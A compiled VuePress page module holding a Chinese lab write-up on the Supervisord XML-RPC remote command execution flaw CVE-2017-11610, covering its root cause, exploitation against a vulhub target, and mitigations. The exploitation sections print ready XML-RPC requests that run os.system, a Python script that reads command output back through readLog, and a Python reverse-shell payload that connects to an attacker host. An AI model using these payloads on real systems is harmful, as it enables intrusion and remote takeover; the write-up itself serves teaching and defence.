import{_ as t}from"./plugin-vue_export-helper-DlAUqK2U.js";import{c as e,a as s,d as p,e as o,b as l,o as c,r}from"./app-C5cR4qpO.js";const i="/DailyNotes/assets/02-ByLNFDCN.png",u="/DailyNotes/assets/01-Ba_qgE9_.png",d="/DailyNotes/assets/03-WPAPa2q6.png",k="/DailyNotes/assets/05-JRyka5lp.png",g={},h={href:"http://www.cnnvd.org.cn/index.html",target:"_blank",rel:"noopener noreferrer"};function m(v,n){const a=r("ExternalLinkIcon");return c(),e("div",null,[n[1]||(n[1]=s("h1",{id:"漏洞名称-supervisord-远程命令执行漏洞",tabindex:"-1"},[s("a",{class:"header-anchor",href:"#漏洞名称-supervisord-远程命令执行漏洞"},[s("span",null,"漏洞名称：Supervisord 远程命令执行漏洞")])],-1)),n[2]||(n[2]=s("hr",null,null,-1)),n[3]||(n[3]=s("h2",{id:"漏洞介绍",tabindex:"-1"},[s("a",{class:"header-anchor",href:"#漏洞介绍"},[s("span",null,"漏洞介绍")])],-1)),s("blockquote",null,[s("p",null,[s("a",h,[n[0]||(n[0]=p("国家信息安全漏洞库 (cnnvd.org.cn)")),o(a)])])]),n[4]||(n[4]=l(`<hr><p>Supervisord是Supervisor的服务端程序，是一款用Python语言开发的管理后台应用（服务）的工具，方便运维人员使用图形化界面进行管理。</p><p>Supervisord曾曝出了一个需认证的远程命令执行漏洞（CVE-2017-11610）。通过POST请求向Supervisord管理界面提交恶意数据，可以获取服务器操作权限，带来严重的安全风险。</p><hr><h3 id="漏洞危害" tabindex="-1"><a class="header-anchor" href="#漏洞危害"><span>漏洞危害</span></a></h3><p>远程攻击者可借助特制的XML-RPC请求利用该漏洞执行任意命令。</p><hr><h3 id="影响范围" tabindex="-1"><a class="header-anchor" href="#影响范围"><span>影响范围</span></a></h3><p>Supervisord 3.1.2 &lt;= Version &lt;=Supervisord 3.3.2</p><hr><h2 id="漏洞原理" tabindex="-1"><a class="header-anchor" href="#漏洞原理"><span>漏洞原理</span></a></h2><p>Supervisor的控制实际上就是一个C/S以RPC协议（远程过程调用协议）的通信的过程。XML-RPC server是其中的一个XML-RPC服务器，C端通过RPC协议可以在Server端执行某个函数，并得到返回结果。那么如果Client端执行了Server端预料之外的函数（如<code>os.system</code>），那么就会导致漏洞的产生。</p><p>一个安全的RPC协议，会有一个函数名的映射，也就是说Client端只能调用在白名单之中的部分函数，并且这个“函数”只是真正函数的一个映射。而我们来看看3.3.2版本中Supervisord是如何处理RPC调用的：</p><pre><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">supervisor_xmlrpc_handler</span><span class="token punctuation">(</span>xmlrpc_handler<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
    <span class="token keyword">def</span> <span class="token function">call</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> method<span class="token punctuation">,</span> params<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> traverse<span class="token punctuation">(</span>self<span class="token punctuation">.</span>rpcinterface<span class="token punctuation">,</span> method<span class="token punctuation">,</span> params<span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">traverse</span><span class="token punctuation">(</span>ob<span class="token punctuation">,</span> method<span class="token punctuation">,</span> params<span class="token punctuation">)</span><span class="token punctuation">:</span>
    path <span class="token operator">=</span> method<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">&#39;.&#39;</span><span class="token punctuation">)</span>
    <span class="token keyword">for</span> name <span class="token keyword">in</span> path<span class="token punctuation">:</span>
        <span class="token keyword">if</span> name<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">&#39;_&#39;</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token comment"># security (don&#39;t allow things that start with an underscore to</span>
            <span class="token comment"># be called remotely)</span>
            <span class="token keyword">raise</span> RPCError<span class="token punctuation">(</span>Faults<span class="token punctuation">.</span>UNKNOWN_METHOD<span class="token punctuation">)</span>
        ob <span class="token operator">=</span> <span class="token builtin">getattr</span><span class="token punctuation">(</span>ob<span class="token punctuation">,</span> name<span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> ob <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
            <span class="token keyword">raise</span> RPCError<span class="token punctuation">(</span>Faults<span class="token punctuation">.</span>UNKNOWN_METHOD<span class="token punctuation">)</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> ob<span class="token punctuation">(</span><span class="token operator">*</span>params<span class="token punctuation">)</span>
    <span class="token keyword">except</span> TypeError<span class="token punctuation">:</span>
        <span class="token keyword">raise</span> RPCError<span class="token punctuation">(</span>Faults<span class="token punctuation">.</span>INCORRECT_PARAMETERS<span class="token punctuation">)</span>
</code></pre><p><code>supervisor_xmlrpc_handlerl</code>类用于处理RPC请求，其call方法就是真正执行远程调用的函数。在call方法中调用了traverse函数，跟进这个函数，我们发现他的逻辑是这样：</p><ol><li>将method用点号分割成数组path</li><li>遍历这个数组，每次获得一个name</li><li>如果name不以下划线开头，则获取ob对象的name属性，其作为新的ob对象</li><li>遍历完成后获得最终的ob对象并调用</li></ol><p>所以，实际上这个函数最后达成的效果就是：**初始ob对象下的任意public方法，包括它的所有递归子对象的任意public方法，都可以被调用。**而此处，ob对象即为<code>self.rpcinterface</code>，官方开发者可能认为可调用的方法只限制在这个对象内部，所以没有做特别严格的白名单限制。</p><p>然而在<code>self.rpcinterface.supervisor.supervisord.options</code>对象下，有一个方法<code>execve</code>，其相当于直接调用了系统的<code>os.execve</code>函数，是可以直接执行任意命令的：</p><pre><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">ServerOptions</span><span class="token punctuation">(</span>Options<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    
    <span class="token keyword">def</span> <span class="token function">execve</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> filename<span class="token punctuation">,</span> argv<span class="token punctuation">,</span> env<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> os<span class="token punctuation">.</span>execve<span class="token punctuation">(</span>filename<span class="token punctuation">,</span> argv<span class="token punctuation">,</span> env<span class="token punctuation">)</span>
</code></pre><hr><h2 id="漏洞利用" tabindex="-1"><a class="header-anchor" href="#漏洞利用"><span>漏洞利用</span></a></h2><hr><h3 id="靶机环境" tabindex="-1"><a class="header-anchor" href="#靶机环境"><span>靶机环境</span></a></h3><p>vulhub/supervisor/CVE-2017-11610</p><hr><h3 id="利用方式-1" tabindex="-1"><a class="header-anchor" href="#利用方式-1"><span>利用方式 1</span></a></h3><blockquote><p>https://www.leavesongs.com/PENETRATION/supervisord-RCE-CVE-2017-11610.html</p></blockquote><hr><h4 id="利用过程" tabindex="-1"><a class="header-anchor" href="#利用过程"><span>利用过程</span></a></h4><p>使用supervisor.supervisord.options.warnings.linecache.os.system方法，可以执行系统命令，然后利用</p><pre><code>POST /RPC2 HTTP/1.1
Host: 192.168.1.189:9001
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 275
&lt;?xml version=&quot;1.0&quot;?&gt;
&lt;methodCall&gt;
&lt;methodName&gt;supervisor.supervisord.options.warnings.linecache.os.system&lt;/methodName&gt;
&lt;params&gt;
&lt;param&gt;
&lt;string&gt;touch /tmp/success&lt;/string&gt;
&lt;/param&gt;
&lt;/params&gt;
&lt;/methodCall&gt;
</code></pre><figure><img src="`+i+'" alt="02" tabindex="0" loading="lazy"><figcaption>02</figcaption></figure><p>可以看到靶机中新建文件成功：</p><figure><img src="'+u+`" alt="01" tabindex="0" loading="lazy"><figcaption>01</figcaption></figure><p>上面poc没有回显，可以将命令执行的结果写入log文件中，再调用Supervisord自带的readLog方法读取log文件，将结果读出来，如下：。</p><pre><code class="language-python"><span class="token comment">#!/usr/bin/env python3</span>
<span class="token keyword">import</span> xmlrpc<span class="token punctuation">.</span>client
<span class="token keyword">import</span> sys


target <span class="token operator">=</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>
command <span class="token operator">=</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span>
<span class="token keyword">with</span> xmlrpc<span class="token punctuation">.</span>client<span class="token punctuation">.</span>ServerProxy<span class="token punctuation">(</span>target<span class="token punctuation">)</span> <span class="token keyword">as</span> proxy<span class="token punctuation">:</span>
    old <span class="token operator">=</span> <span class="token builtin">getattr</span><span class="token punctuation">(</span>proxy<span class="token punctuation">,</span> <span class="token string">&#39;supervisor.readLog&#39;</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span>

    logfile <span class="token operator">=</span> <span class="token builtin">getattr</span><span class="token punctuation">(</span>proxy<span class="token punctuation">,</span> <span class="token string">&#39;supervisor.supervisord.options.logfile.strip&#39;</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token builtin">getattr</span><span class="token punctuation">(</span>proxy<span class="token punctuation">,</span> <span class="token string">&#39;supervisor.supervisord.options.warnings.linecache.os.system&#39;</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token string">&#39;{} | tee -a {}&#39;</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>command<span class="token punctuation">,</span> logfile<span class="token punctuation">)</span><span class="token punctuation">)</span>
    result <span class="token operator">=</span> <span class="token builtin">getattr</span><span class="token punctuation">(</span>proxy<span class="token punctuation">,</span> <span class="token string">&#39;supervisor.readLog&#39;</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span>

    <span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">[</span><span class="token builtin">len</span><span class="token punctuation">(</span>old<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
</code></pre><figure><img src="`+d+`" alt="03" tabindex="0" loading="lazy"><figcaption>03</figcaption></figure><p>使用supervisor.supervisord.options.warnings.linecache.os.system方法，首先在攻击机监听4444端口，等待靶机反弹shell。</p><p>发送payload如下：</p><pre><code>POST /RPC2 HTTP/1.1
Host: 192.168.1.189:9001
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 428

&lt;?xml version=&quot;1.0&quot;?&gt;
&lt;methodCall&gt;
&lt;methodName&gt;supervisor.supervisord.options.warnings.linecache.os.system&lt;/methodName&gt;
&lt;params&gt;
&lt;param&gt;
&lt;string&gt;python -c &quot;import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#39;10.182.234.169&#39;,4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&#39;/bin/bash&#39;,&#39;-i&#39;]);&quot;
&lt;/string&gt;
&lt;/param&gt;
&lt;/params&gt;
&lt;/methodCall&gt;
</code></pre><p>效果为利用<code>supervisor.supervisord.options.warnings.linecache.os.system</code>方法通过python程序反弹shell，连接到攻击机的4444端口。</p><figure><img src="`+k+`" alt="05" tabindex="0" loading="lazy"><figcaption>05</figcaption></figure><hr><h3 id="利用方式-2" tabindex="-1"><a class="header-anchor" href="#利用方式-2"><span>利用方式 2</span></a></h3><pre><code>POST /RPC2 HTTP/1.1
Host: 192.168.1.189:9001
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 439

&lt;?xml version=&quot;1.0&quot;?&gt;
&lt;methodCall&gt;
&lt;methodName&gt;supervisor.supervisord.options.execve&lt;/methodName&gt;
&lt;params&gt;
&lt;param&gt;
&lt;string&gt;/usr/local/bin/python&lt;/string&gt;
&lt;/param&gt;
&lt;param&gt;
&lt;array&gt;
&lt;data&gt;
&lt;value&gt;&lt;string&gt;python&lt;/string&gt;&lt;/value&gt;
&lt;value&gt;&lt;string&gt;-c&lt;/string&gt;&lt;/value&gt;
&lt;value&gt;&lt;string&gt;import os;os.system(&#39;touch /tmp/success&#39;);&lt;/string&gt;&lt;/value&gt;
&lt;/data&gt;
&lt;/array&gt;
&lt;/param&gt;
&lt;param&gt;
&lt;struct&gt;
&lt;/struct&gt;
&lt;/param&gt;
&lt;/params&gt;
&lt;/methodCall&gt;
</code></pre><p>这个<code>self.rpcinterface.supervisor.supervisord.options.execve</code>其实有些问题，Python的<code>os.execve</code>函数会使用新进程取代现有的进程。也就是说，这里会导致Supervisord本身退出。</p><p>基于Docker容器的Supervisord（如Vulhub里这个靶场），如果基础进程Supervisord被退出，那么将导致整个容器被退出，即使我们执行了任意命令，我们获得的权限也是转瞬即逝的。</p><hr><h2 id="威胁防护建议" tabindex="-1"><a class="header-anchor" href="#威胁防护建议"><span>威胁防护建议</span></a></h2><hr><h3 id="用户处置建议" tabindex="-1"><a class="header-anchor" href="#用户处置建议"><span>用户处置建议</span></a></h3><ol><li>升级Supervisord</li><li>端口访问控制</li><li>设置复杂RPC密码</li></ol><hr><h3 id="安全产品检测建议" tabindex="-1"><a class="header-anchor" href="#安全产品检测建议"><span>安全产品检测建议</span></a></h3><ol><li><p>检测漏洞利用链<code>self.rpcinterface.supervisor.supervisord.options.execve</code></p></li><li><p>检测漏洞利用链<code>supervisor.supervisord.options.warnings.linecache.os.system</code></p></li></ol>`,55))])}const b=t(g,[["render",m],["__file","supervisor_CVE-2017-11610.html.vue"]]),w=JSON.parse(`{"path":"/CyberSecurity/RedTeam/2-WebVulnerability/supervisor/supervisor_CVE-2017-11610.html","title":"漏洞名称：Supervisord 远程命令执行漏洞","lang":"zh-CN","frontmatter":{"description":"漏洞名称：Supervisord 远程命令执行漏洞 漏洞介绍 国家信息安全漏洞库 (cnnvd.org.cn) Supervisord是Supervisor的服务端程序，是一款用Python语言开发的管理后台应用（服务）的工具，方便运维人员使用图形化界面进行管理。 Supervisord曾曝出了一个需认证的远程命令执行漏洞（CVE-2017-11610...","head":[["meta",{"property":"og:url","content":"https://echo0d.github.io/DailyNotes/CyberSecurity/RedTeam/2-WebVulnerability/supervisor/supervisor_CVE-2017-11610.html"}],["meta",{"property":"og:site_name","content":"echo0d'notes"}],["meta",{"property":"og:title","content":"漏洞名称：Supervisord 远程命令执行漏洞"}],["meta",{"property":"og:description","content":"漏洞名称：Supervisord 远程命令执行漏洞 漏洞介绍 国家信息安全漏洞库 (cnnvd.org.cn) Supervisord是Supervisor的服务端程序，是一款用Python语言开发的管理后台应用（服务）的工具，方便运维人员使用图形化界面进行管理。 Supervisord曾曝出了一个需认证的远程命令执行漏洞（CVE-2017-11610..."}],["meta",{"property":"og:type","content":"article"}],["meta",{"property":"og:locale","content":"zh-CN"}],["meta",{"property":"og:updated_time","content":"2024-11-15T10:05:31.000Z"}],["meta",{"property":"article:author","content":"echo0d"}],["meta",{"property":"article:modified_time","content":"2024-11-15T10:05:31.000Z"}],["script",{"type":"application/ld+json"},"{\\"@context\\":\\"https://schema.org\\",\\"@type\\":\\"Article\\",\\"headline\\":\\"漏洞名称：Supervisord 远程命令执行漏洞\\",\\"image\\":[\\"\\"],\\"dateModified\\":\\"2024-11-15T10:05:31.000Z\\",\\"author\\":[{\\"@type\\":\\"Person\\",\\"name\\":\\"echo0d\\",\\"url\\":\\"\\"}]}"]]},"headers":[{"level":2,"title":"漏洞介绍","slug":"漏洞介绍","link":"#漏洞介绍","children":[{"level":3,"title":"漏洞危害","slug":"漏洞危害","link":"#漏洞危害","children":[]},{"level":3,"title":"影响范围","slug":"影响范围","link":"#影响范围","children":[]}]},{"level":2,"title":"漏洞原理","slug":"漏洞原理","link":"#漏洞原理","children":[]},{"level":2,"title":"漏洞利用","slug":"漏洞利用","link":"#漏洞利用","children":[{"level":3,"title":"靶机环境","slug":"靶机环境","link":"#靶机环境","children":[]},{"level":3,"title":"利用方式 1","slug":"利用方式-1","link":"#利用方式-1","children":[]},{"level":3,"title":"利用方式 2","slug":"利用方式-2","link":"#利用方式-2","children":[]}]},{"level":2,"title":"威胁防护建议","slug":"威胁防护建议","link":"#威胁防护建议","children":[{"level":3,"title":"用户处置建议","slug":"用户处置建议","link":"#用户处置建议","children":[]},{"level":3,"title":"安全产品检测建议","slug":"安全产品检测建议","link":"#安全产品检测建议","children":[]}]}],"git":{"createdTime":1731665131000,"updatedTime":1731665131000,"contributors":[{"name":"echo0d","email":"echo0d@163.com","commits":1}]},"readingTime":{"minutes":4.3,"words":1290},"filePathRelative":"CyberSecurity/RedTeam/2-WebVulnerability/supervisor/supervisor_CVE-2017-11610.md","localizedDate":"2024年11月15日","autoDesc":true,"excerpt":"\\n<hr>\\n<h2>漏洞介绍</h2>\\n<blockquote>\\n<p><a href=\\"http://www.cnnvd.org.cn/index.html\\" target=\\"_blank\\" rel=\\"noopener noreferrer\\">国家信息安全漏洞库 (cnnvd.org.cn)</a></p>\\n</blockquote>\\n<hr>\\n<p>Supervisord是Supervisor的服务端程序，是一款用Python语言开发的管理后台应用（服务）的工具，方便运维人员使用图形化界面进行管理。</p>\\n<p>Supervisord曾曝出了一个需认证的远程命令执行漏洞（CVE-2017-11610）。通过POST请求向Supervisord管理界面提交恶意数据，可以获取服务器操作权限，带来严重的安全风险。</p>"}`);export{b as comp,w as data};
